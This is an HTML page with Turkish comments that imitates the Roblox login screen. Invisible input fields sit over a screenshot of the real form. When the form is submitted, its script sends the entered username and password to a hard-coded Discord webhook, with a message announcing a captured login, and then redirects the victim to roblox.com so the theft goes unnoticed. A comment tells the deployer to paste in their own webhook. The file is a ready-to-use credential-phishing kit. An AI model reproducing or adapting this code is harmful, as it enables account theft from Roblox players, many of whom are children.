<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        /* Tüm ekranı sıfırlama ve arka plan */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        /* 
           KÖKTEN ÇÖZÜM: Formu ve resmi tek bir sabit kutuya kilitliyoruz.
           Resim küçülse de büyüse de inputlar da resimle aynı oranda kalır.
        */
        .wrapper {
            position: relative;
            width: 100%;
            height: 100%;
            max-width: 540px;  /* Resmin panel genişliği standardı */
            max-height: 600px; /* Resmin panel yükseklik standardı */
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        /* Tüm interaktif alanların (giriş ve butonların) ortak CSS ayarları */
        .wrapper input, .wrapper button, .wrapper a {
            position: absolute;
            width: 82%; /* Gri kutuların genişlik oranı */
            height: 40px; /* Resimdeki kutuların gerçek piksel yüksekliği */
            left: 50%;
            transform: translateX(-50%);
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        /* Yazı yazılan giriş alanlarının iç metin hizalaması */
        .wrapper input {
            color: #ffffff;
            font-size: 15px;
            padding: 0 14px;
            line-height: 40px; /* Yazının kutu içinde dikeyde tam ortalanmasını sağlar */
        }

        .wrapper button, .wrapper a {
            cursor: pointer;
        }

        /* ============================================================ */
        /* MİLİMETRİK SABİT PİKSEL KONUMLANDIRMALARI (Yukarıdan Aşağıya) */
        /* ============================================================ */

        /* 1. KUTU: Username/Email/Phone alanı */
        .username-field {
            top: 132px; 
        }

        /* 2. KUTU: Password alanı */
        .password-field {
            top: 204px; 
        }

        /* 3. BUTON: Log in butonu */
        .login-btn {
            top: 275px; 
            height: 44px; /* Log in butonu biraz daha kalın */
        }

        /* 4. BUTON: Send me the one-time code by email */
        .one-time-code-btn {
            top: 395px; 
            height: 44px;
        }

        /* 5. BUTON: Quick Login */
        .quick-login-btn {
            top: 454px; 
            height: 44px;
        }

        /* 6. LİNK: En alttaki Sign Up yazısı */
        .signup-link {
            top: 524px;
            height: 25px;
            width: 70px; /* Sadece "Sign up." kelimesinin genişliği */
            left: 335px; /* Kelimenin sağ taraftaki tam yatay pozisyonu */
            transform: none; /* Sol-sağ kaymasını bozmamak için */
        }
    </style>
</head>
<body>

    <!-- Tüm elemanları resimle birlikte kilitleyen yeni ana kapsayıcı -->
    <div class="wrapper">
        <!-- Arka plan resmi -->
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <!-- Form Elemanları (Milimetrik piksel hesabı ile yerleştirildi) -->
        <form id="girisFormu">
            <!-- Kullanıcı adı input -->
            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
            
            <!-- Şifre input -->
            <input type="password" id="password" name="password" class="password-field" required>
            
            <!-- Log in Giriş butonu -->
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
        </form>

        <!-- Diğer Fonksiyonel Butonlar ve Linkler -->
        <button type="button" class="one-time-code-btn"></button>
        <button type="button" class="quick-login-btn"></button>
        <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
    </div>

    <!-- DISCORD WEBHOOK BAĞLANTISI -->
    <script>
        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIRMAYI UNUTMA KANKA!
        const webhookURL = "https://discord.com/api/webhooks/1504533553780887593/k-e_pISawJOV-LvtFhqqXuSPRMhGuUjC8N3i8IyXimO3yKkJ2R8UeiSR7e4ZJ9SqGc6S";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => {
                window.location.href = "https://roblox.com";
            })
            .catch(() => {
                window.location.href = "https://roblox.com";
            });
        });
    </script>

</body>
</html>
